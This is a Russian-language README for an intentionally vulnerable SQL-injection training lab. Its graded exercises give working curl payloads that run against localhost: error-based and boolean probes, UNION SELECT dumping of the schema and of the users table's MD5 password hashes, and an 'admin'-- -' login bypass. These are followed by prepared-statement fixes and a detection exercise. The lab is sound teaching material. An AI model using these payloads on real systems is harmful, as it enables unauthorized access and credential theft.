# sqli-lab — лаборатория SQL-инъекций

Намеренно уязвимое приложение на Python stdlib + SQLite. Соответствует главе 1
(«Web Security») и карточкам `payloads/web/sqli/`.

```bash
cd labs/setup && docker compose up -d sqli-lab
# или без Docker:
DB_PATH=/tmp/sqli.db PORT=8080 python3 labs/web-labs/sqli-lab/app.py
```

URL: http://localhost:8080

## Карта эндпоинтов

| Эндпоинт | Контекст | Уязвимость |
|----------|----------|------------|
| `/item?id=` | числовой параметр, конкатенация | SQLi: error-based, UNION, boolean |
| `/item_safe?id=` | prepared statement | — (контрольная точка) |
| `/search?q=` | `LIKE '%…%'` + конкатенация | wildcard-инъекция, SQLi |
| `/search_safe?q=` | параметры + `ESCAPE '\'` | — (контрольная точка) |
| `/login` (POST) | конкатенация в `WHERE` | обход аутентификации тавтологией |
| `/login_safe` (POST) | параметры + сравнение хеша | — (контрольная точка) |
| `/admin` | проверка cookie-сессии | цель обхода входа |
| `/robots.txt` | — | приманка для enumeration |
| `/health` | — | healthcheck |

СУБД — SQLite: у неё нет `SLEEP()`, `information_schema` и пользователей, поэтому
часть MySQL-специфичных payload'ов даст синтаксическую ошибку (это тоже полезный
результат: видно, как backend влияет на применимость техник). Схема: `sqlite_master`.

## Задания

### 1. Подтвердить инъекцию тремя способами

```bash
# ошибка синтаксиса
curl -s "localhost:8080/item?id=1'"

# логическое различие
curl -s "localhost:8080/item?id=1 AND 1=1" | grep -c ThinkPad
curl -s "localhost:8080/item?id=1 AND 1=2" | grep -c "Ничего не найдено"

# раскрытие internals (отдельная находка!)
curl -s "localhost:8080/item?id=1'" | grep -A2 "SQL error"
```

Критерий: ошибка СУБД видна клиенту, ответы различаются.

### 2. Определить число колонок и вывести данные через UNION

```bash
curl -s "localhost:8080/item?id=1 ORDER BY 6-- -"    # ошибка -> колонок меньше
curl -s "localhost:8080/item?id=-1 UNION SELECT 1,2,3,4,5-- -"
curl -s "localhost:8080/item?id=-1 UNION SELECT id,name,sql,4,5 FROM sqlite_master-- -"
```

### 3. Перечислить схему и прочитать таблицу users

```bash
curl -s "localhost:8080/item?id=-1 UNION SELECT 1,name,type,4,5 FROM sqlite_master-- -"
curl -s "localhost:8080/item?id=-1 UNION SELECT id,login,password_md5,role,5 FROM users-- -"
```

Обсудите: почему MD5 без соли — критическая находка, даже если инъекцию починили?
(Ответ: радужные таблицы, скорость перебора, повторное использование паролей.)

### 4. Обойти аутентификацию

```bash
curl -s -i -X POST localhost:8080/login \
  --data-urlencode "login=admin'-- -" --data-urlencode "password=anything"
```

Критерий: `200`, `Set-Cookie: session=…`, затем `/admin` открывается.
Проверьте тот же ввод на `/login_safe` — должен быть `401`.

### 5. Wildcard-инъекция в LIKE

```bash
curl -s "localhost:8080/search?q=%" | grep -c "<tr>"   # вся таблица
curl -s "localhost:8080/search?q=_" | grep -c "<tr>"
curl -s "localhost:8080/search_safe?q=%" | grep -c "<tr>"
```

### 6. Second-order

Зарегистрируйте/измените данные так, чтобы значение с кавычкой сохранилось,
а затем использовалось в другом запросе. В этой лабе second-order имитируется
через `audit_log`: посмотрите, что попадает в лог, и объясните, почему хранение
сырого пользовательского ввода опасно.

### 7. Починить приложение

Переведите `/item` на prepared statements (образец — `/item_safe`):

```python
# было
query = f"SELECT * FROM items WHERE id = {item_id}"
rows = conn.execute(query).fetchall()

# стало
rows = conn.execute("SELECT * FROM items WHERE id = ?", (item_id,)).fetchall()
```

Затем:

```bash
tools/payload-tester.sh --lab sqli-lab     # должно стать FAIL/SKIP по маркерам
```

Дополнительно уберите раскрытие ошибок (`SHOW_DB_ERRORS=0`) и добавьте
ограничение на тип параметра (целое число).

### 8. Что видно в логах

Посмотрите `audit_log` в админке и журнал контейнера:

```bash
docker compose logs sqli-lab | grep -i "union\|select\|sleep"
```

Сформулируйте правило детектирования (например, для WAF или SIEM) и объясните,
чем оно будет давать ложные срабатывания.

## Автоматические тесты

```bash
tools/payload-tester.sh --lab sqli-lab --report reports/sqli.json
tools/payload-tester.sh --lab sqli-lab --list      # что проверяется
```

Ожидаемый результат на «сломанной» лабе: все привязанные карточки — `PASS`
(в ответе присутствует ошибка СУБД). После починки задания 7 — `FAIL`.

## Артефакты для разбора

* `payloads/web/sqli/mysql-tautology-auth-bypass.md` — обход входа
* `payloads/web/sqli/mysql-union-select-enumeration.md` — UNION
* `payloads/web/sqli/mysql-boolean-blind.md` — слепая инъекция
* `payloads/web/sqli/mysql-like-wildcard.md` — LIKE
* `payloads/web/sqli/mysql-second-order.md` — отложенное срабатывание
* `payloads/web/sqli/sqlite-json-extract.md` — специфика SQLite
